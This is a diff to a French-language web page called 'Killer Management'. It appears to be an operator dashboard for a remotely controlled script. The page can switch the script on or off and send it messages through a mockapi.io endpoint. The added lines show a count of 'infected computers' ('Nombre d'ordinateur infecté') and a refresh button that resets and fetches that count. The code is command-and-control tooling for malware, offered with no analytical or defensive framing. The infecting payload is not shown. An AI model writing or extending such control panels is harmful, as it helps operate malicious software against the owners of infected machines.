@@ -12,6 +12,17 @@
         <div class="card shadow-sm mx-auto" style="max-width: 400px;">
             <div class="card-body text-center">
                 <h3 class="card-title mb-4">Killer Management</h3>
+                <p>
+                    Nombre d'ordinateur infecté : 
+                    <span id="spaNbPcInfect" class="fw-bold">-</span>
+                    <button id="btnRefresh" class="btn btn-outline-secondary btn-sm ms-2 p-1" title="Rafraîchir le nombre d'ordinateurs infectés">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" id="loadingIcon" class="bi bi-arrow-clockwise" viewBox="0 0 16 16">
+                            <path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2z"/>
+                            <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466"/>
+                        </svg>
+                    </button>
+                </p>
+                <hr class="my-4">
                 <button id="btnIsActive" class="btn btn-primary mb-3">Changer l'activité du script</button>
                 <p class="mb-0">Valeur actuelle : 
                     <span id="SpaIsActive" class="fw-bold text-success">...</span>
@@ -31,17 +42,29 @@
             </div>
         </div>
     </div>
-
+    <style>
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading {
+            animation: rotate 1s linear infinite;
+        }
+    </style>
     <script>
         const btnIsActive = document.getElementById('btnIsActive');
         const SpaIsActive = document.getElementById('SpaIsActive');
         const form = document.getElementById('messageForm');
         const messageInput = document.getElementById('messageInput');
         const messageFeedback = document.getElementById('messageFeedback');
+        const btnRefresh = document.getElementById('btnRefresh');
+        const SpaNbPcInfect = document.getElementById('spaNbPcInfect');
+        const loadingIcon = document.getElementById('loadingIcon');
         const timeToWait = 10000;
         const url = 'https://68138d49129f6313e211a66e.mockapi.io/management/1';
         let isActive;
         let messageIncr;
+        let nbPcInfectIncr;
 
         initialize();
 
@@ -133,6 +156,53 @@
             });
         });
 
+        btnRefresh.addEventListener('click', function () {
+            btnRefresh.disabled = true;
+
+            const originalText = btnRefresh.innerHTML;
+            let secondsLeft = 10;
+            btnRefresh.innerText = `Attendez ${secondsLeft}s`;
+
+            const countdown = setInterval(() => {
+                secondsLeft--;
+                btnRefresh.innerText = `Attendez ${secondsLeft}s`;
+
+                if (secondsLeft <= 0) {
+                    clearInterval(countdown);
+                    btnRefresh.disabled = false;
+                    btnRefresh.innerHTML = originalText;
+                }
+            }, 1000);
+
+            fetch(url, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    nbPcInfect: {
+                        nbPcInfect: 0,
+                        nbPcInfectIncr: nbPcInfectIncr + 1
+                    }
+                })
+            })
+            .then(() => {
+                return fetch(url);
+            })
+            .then(response => response.json())
+            .then(data => {
+                nbPcInfectIncr = data.nbPcInfect.nbPcInfectIncr;
+                SpaNbPcInfect.innerText = data.nbPcInfect.nbPcInfect;
+            })
+            .catch(error => {
+                console.error('Erreur lors de la mise à jour ou récupération des données:', error);
+                clearInterval(countdown);
+                btnRefresh.disabled = false;
+                btnRefresh.innerText = originalText;
+            })
+        });
+
+
         function initialize() {
             fetch(url)
                 .then(response => response.json())
@@ -140,7 +210,9 @@
                     isActive = data.isActive;
                     SpaIsActive.innerText = isActive ? 'Actif' : 'Inactif';
                     SpaIsActive.className = isActive ? 'fw-bold text-success' : 'fw-bold text-danger';
+                    SpaNbPcInfect.innerText = "-";
 
+                    nbPcInfectIncr = data.nbPcInfect.nbPcInfectIncr;
                     messageIncr = data.message.incr;
                 })
                 .catch(error => {
